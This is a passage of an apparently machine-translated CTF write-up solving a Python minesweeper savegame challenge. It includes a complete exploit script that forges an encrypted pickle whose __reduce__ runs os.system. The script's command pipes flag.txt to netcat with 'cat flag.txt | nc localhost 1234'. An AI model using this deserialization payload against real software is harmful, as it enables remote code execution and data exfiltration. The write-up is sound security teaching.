class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Payload</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(object)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, cmd)</span></span></span><span class="hljs-function">:</span></span> self.cmd = cmd <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__reduce__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (os.system, (self.cmd,))</code> </pre><br>  Things are easy - we write main (): <br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#  "" ,     encrypted = base64.standard_b64decode( 'Sqp2o3wcpQh6QGo4hT+x8U460tEeiF' \ 'UL9WmcTGcjP+AtaaIlYwjpB5V6ag/V' \ 'rPRsVstMs2N3WLOSgzzUUIbIDbnvxF' \ 'ECoGugBcTl+DR6NTKctUxpl+yjCSO7' \ 'uwL/+Az5w+9vNpVky+QChWcP0OfHAG' \ '8F7Nx3bFSFoHFc+hEGiSCmZHfu4Ppt' \ 'QNtQsdy00Zrhv+lCPv+6LQxltt+u39' \ 'zLbKVnOsaLF+j0JOW3hx352U5/UIVP' \ '2xav1OcIy30n+IhmIhbikpnmk2Kc8r' \ 'Le5qMX56v/irjSqbXnIsfgeKY4DfoS' \ 'Vp79YT+c+HxDP2roMyTeS+d10uUEYM' \ 'Mp0Q==' ) #  ,    reconstructed = FieldFake( 16, 16, [ (1, 12), (1, 14), (2, 10), (2, 12), (2, 14), (3, 6), (4, 0), (4, 15), (5, 2), (8, 12), (8, 13), (8, 14), (10, 5), (10, 9), (11, 7), (11, 11), (13, 2), (13, 9), (14, 3), (14, 15) ] ) #  +  +  ( ,  ) unencrypted = gamehash(reconstructed.dump()) #    part_of_key = crypt(unencrypted, encrypted) #   evilpickle = pickle.dumps(Payload('cat flag.txt | nc localhost 1234')) #  base64.  ! evilsave = base64.standard_b64encode(crypt(gamehash(evilpickle), part_of_key)) print evilsave</span></span></code> </pre><br>  One could come up with something more original (up to the receipt of the shell), but for ease of demonstration, as a command, select a simple <i>cat</i> for output to localhost on port 1234 in sdout the contents of the <i>flag.txt</i> file, which we assume would be in the same the directory on the server from which the script was launched (in our case, you must first put it there;)), and we also have some privileges to read. <br><br>  Putting it together and check the work: <br><div class="spoiler">  <b class="spoiler_title">evilsave.py</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 # -*- coding: UTF-8 -*- # Usage: python3 evilsave.py import hashlib, base64, pickle class FieldFake: def __init__(self, w, h, mines): self.w = w self.h = h self.mines = sorted(set(mines)) self.opened = [] self.flagged = [] def dump(self): return pickle.dumps(self.__dict__, protocol=1) class Payload(object): def __init__(self, cmd): self.cmd = cmd def __reduce__(self): import os return (os.system, (self.cmd,)) def gamehash(gamepickle): h = hashlib.sha1() h.update(gamepickle) return '4n71cH3aT' + h.digest() + gamepickle def crypt(plain, key): return ''.join([chr(ord(p) ^ ord(key[i % len(key)])) for i, p in enumerate(plain) ]) def main(): #  "" ,     encrypted = base64.standard_b64decode( 'Sqp2o3wcpQh6QGo4hT+x8U460tEeiF' \ 'UL9WmcTGcjP+AtaaIlYwjpB5V6ag/V' \ 'rPRsVstMs2N3WLOSgzzUUIbIDbnvxF' \ 'ECoGugBcTl+DR6NTKctUxpl+yjCSO7' \ 'uwL/+Az5w+9vNpVky+QChWcP0OfHAG' \ '8F7Nx3bFSFoHFc+hEGiSCmZHfu4Ppt' \ 'QNtQsdy00Zrhv+lCPv+6LQxltt+u39' \ 'zLbKVnOsaLF+j0JOW3hx352U5/UIVP' \ '2xav1OcIy30n+IhmIhbikpnmk2Kc8r' \ 'Le5qMX56v/irjSqbXnIsfgeKY4DfoS' \ 'Vp79YT+c+HxDP2roMyTeS+d10uUEYM' \ 'Mp0Q==' ) #  ,    reconstructed = FieldFake( 16, 16, [ (1, 12), (1, 14), (2, 10), (2, 12), (2, 14), (3, 6), (4, 0), (4, 15), (5, 2), (8, 12), (8, 13), (8, 14), (10, 5), (10, 9), (11, 7), (11, 11), (13, 2), (13, 9), (14, 3), (14, 15) ] ) #  +  +  ( ,  ) unencrypted = gamehash(reconstructed.dump()) #    part_of_key = crypt(unencrypted, encrypted) #   evilpickle = pickle.dumps(Payload('cat flag.txt | nc localhost 1234')) #  base64.  ! evilsave = base64.standard_b64encode(crypt(gamehash(evilpickle), part_of_key)) print evilsave if __name__ == '__main__': main()</span></span></code> </pre><br></div></div><br>  And despite the fact that they wrote a warning to us " <i>Unable to load savegame (exception)</i> " (the generator of which was an <i>exception</i> that was thrown by <i>pickle.loads ()</i> ) ... <br><img src="https://habrastorage.org/getpro/habr/post_images/5fe/35a/2c0/5fe35a2c06055da741fd776b3e8ae067.jpg" alt="image"><br><br>  ... in the next terminal window (also on the "client" side) we were able to get the contents of the <i>flag.txt</i> file, hooray, hurray: <br><img src="https://habrastorage.org/getpro/habr/post_images/611/c5d/689/611c5d68910b1485ef1082ba449e0220.png" alt="image"><br><br><h2>  <font color="#cc0000">Conclusion</font> </h2><br>  Task is very beautiful and original (besides, in my opinion, it well demonstrates Python's meticulous elegance and versatility), but it is quite simple, if you figure out what it was (not for nothing, only 100 points were given for it), therefore it is quite clear what caused such difficulties for the participants of the competition in the plot of the series.  However, his decision by the protagonist &lt;for half a minute without scrolling the source code is really beyond praise, he needed to slip the task of equality <b>P</b> and <b>NP</b> - with this approach, it‚Äôs all the same what to solve J <br><br>  Serialize only validated data, use <a href="https://habrahabr.ru/post/339910/">strong</a> encryption, play good games and do not produce ‚Äúevil‚Äù savings. <br><br>  Happy hacking! <br><img src="https://habrastorage.org/getpro/habr/post_images/698/9a2/8f4/6989a28f4185de569a359ada845c920b.gif" alt="image"><br><br><h2>  <font color="#cc0000">Interesting links</font> </h2><br><ol><li>  CTFtime.org / 29c3 CTF / minesweeper - <a href="https://ctftime.org/task/193">ctftime.org/task/193</a> </li><li>  Mr.Robot.S03.  As a new season, "Mr. Robot" pleased fans with Easter eggs and hacker games - "Hacker" - <a href="https://xakep.ru/2018/01/29/mrrobot-s03">xakep.ru/2018/01/29/mrrobot-s03</a> </li><li>  Cryptic python "minesweeper" challenge: MrRobot - <a href="https://reddit.com/r/MrRobot/comments/76kz6m/cryptic_python_minesweeper_challenge">reddit.com/r/MrRobot/comments/76kz6m/cryptic_python_minesweeper_challenge</a> </li></ol></div><p>Source: <a href="https://habr.com/ru/post/351360/">https://habr.com/ru/post/351360/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../351344/index.html">Conference DEFCON 16. "Games with bar codes." Felix Lindner, head of Recurity Labs</a></li>
<li><a href="../351350/index.html">Uploading messages using the Telegram API. Where to begin</a></li>
<li><a href="../351352/index.html">Online implementation of localStorage</a></li>
<li><a href="../351354/index.html">Optimize the performance of sound projects</a></li>
<li><a href="../351356/index.html">Disruption of a large-scale hacker attack on Windows users in Russia</a></li>
<li><a href="../351362/index.html">‚ÄúDigital States‚Äù: how they evolved</a></li>
<li><a href="../351364/index.html">The battle for network neutrality: two and a half years Net Neutrality</a></li>
<li><a href="../351366/index.html">Battle of Network Neutrality: A State War</a></li>
<li><a href="../351368/index.html">Network Digest: 20 materials on networks, protocols and the battle for Net Neutrality</a></li>
<li><a href="../351370/index.html">Hash steganography using vkapi</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>